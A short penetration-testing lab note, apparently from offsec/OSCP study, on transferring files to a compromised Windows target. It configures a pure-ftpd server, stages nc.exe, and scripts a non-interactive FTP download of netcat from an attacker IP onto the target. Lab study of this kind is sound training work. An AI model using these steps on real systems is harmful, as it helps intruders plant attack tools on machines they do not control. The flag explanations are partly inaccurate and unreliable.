# File Transfers

sudo apt install pure-ftpd

```bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd
```
sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/

We could make a text file that contains the FTP process:
```
open 192.168.119.153
USER offsec
lab>
bin
GET nc.exe
bye
```

And transfer it to the target:
`ftp -v -n -s:ftp.txt`

* `-v` to suppress output.
* `-n` to suppress automatic login.
* `-s` to indicate the filename of commands.

